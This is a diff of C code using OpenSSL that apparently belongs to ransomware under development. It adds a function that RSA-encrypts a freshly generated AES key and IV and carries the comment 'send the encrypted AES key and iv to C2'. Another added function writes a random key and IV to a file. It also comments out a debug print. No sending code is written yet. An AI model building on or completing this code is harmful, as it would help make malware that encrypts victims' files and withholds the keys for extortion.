@@ -26,6 +26,17 @@ void error_and_exit(const char* msg) {
     exit(EXIT_FAILURE);
 }
 
+void encryptAndSendKeyIV(const char *public_key_pem, const unsigned char *key, size_t key_size, const unsigned char *iv, size_t iv_size) {
+    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key, key_size);
+    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv, iv_size);
+
+    //send the encrypted AES key and iv to C2
+
+    OPENSSL_free(encrypted_aes_key);
+    OPENSSL_free(encrypted_iv);
+}
+
+
 unsigned char* encrypt_RSA(const char *public_key_pem, unsigned char* in, size_t inlen){
     //Documentation example: https://github.com/danbev/learning-openssl/blob/master/rsa.c
 
@@ -49,7 +60,7 @@ unsigned char* encrypt_RSA(const char *public_key_pem, unsigned char* in, size_t
     size_t outlen;
     unsigned char* out;
 
-    printf("Going to encrypt: %s\n", in);
+    // printf("Going to encrypt: %s\n", in);
     // Determine the size of the output
     if (EVP_PKEY_encrypt(enc_ctx, NULL, &outlen, in, inlen) <= 0) {
         error_and_exit("EVP_PKEY_encrypt failed1");
@@ -355,4 +366,41 @@ int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad,
         /* Verify failed */
         return -1;
     }
+}
+
+void generateAndWriteKeyIV() {
+    unsigned char key[32];
+    unsigned char iv[16];
+
+    // Generate AES key
+    RAND_bytes(key, sizeof(key));
+
+    // Generate IV
+    RAND_bytes(iv, sizeof(iv));
+
+    // Convert key and iv to printable strings
+    char key_lisible[65]; // 32 + 1 (end line)
+    char iv_lisible[33];  // 16 + 1 (end line)
+
+    for (size_t i = 0; i < sizeof(key); ++i) {
+        sprintf(&key_lisible[i * 2], "%02x", key[i]);
+    }
+
+    for (size_t i = 0; i < sizeof(iv); ++i) {
+        sprintf(&iv_lisible[i * 2], "%02x", iv[i]);
+    }
+
+    // Write key and iv to file
+    FILE *file_pointer;
+    file_pointer = fopen("aes_key.key", "w");
+
+    if (file_pointer == NULL) {
+        printf("Error: cannot open the file.\n");
+        exit(1);
+    }
+
+    fprintf(file_pointer, "%s\n", key_lisible);
+    fprintf(file_pointer, "%s\n", iv_lisible);
+
+    fclose(file_pointer);
 }
